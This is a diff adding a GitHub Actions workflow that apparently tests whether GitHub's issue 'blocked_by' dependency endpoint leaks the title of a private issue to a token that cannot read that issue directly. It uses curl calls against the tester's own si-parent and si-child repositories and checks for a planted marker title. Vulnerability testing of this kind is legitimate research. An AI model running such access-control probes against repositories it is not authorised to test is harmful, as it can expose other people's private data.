@@ -1,0 +1,21 @@
+name: idor-read-test
+on: { workflow_dispatch: {} }
+permissions:
+  issues: read
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: READ-side IDOR (scoped token reads si-parent blockedBy referencing PRIVATE si-child)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          API="X-GitHub-Api-Version: 2026-03-10"
+          echo "===STEP1: scoped token reading si-child PRIVATE issue directly (expect 404 = no access)==="
+          curl -s -o /tmp/r1 -w "HTTP=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "$API" https://api.github.com/repos/jackpas23/si-child/issues/1
+          echo "===STEP2: scoped token GET si-parent#1 blocked_by (dependency to PRIVATE si-child already exists, created by owner)==="
+          curl -s -o /tmp/r2 -w "HTTP=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "$API" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by
+          echo "body(900): $(head -c 900 /tmp/r2)"
+          echo ""
+          if grep -qi "CHILD-SECRET-TITLE" /tmp/r2; then echo "[IMPACT] READ-SIDE IDOR: PRIVATE si-child title CHILD-SECRET-TITLE LEAKED to a token that gets 404 reading si-child directly"; else echo "[RESULT] No leak — blockedBy read-side filters inaccessible referenced issues (hardened)"; fi
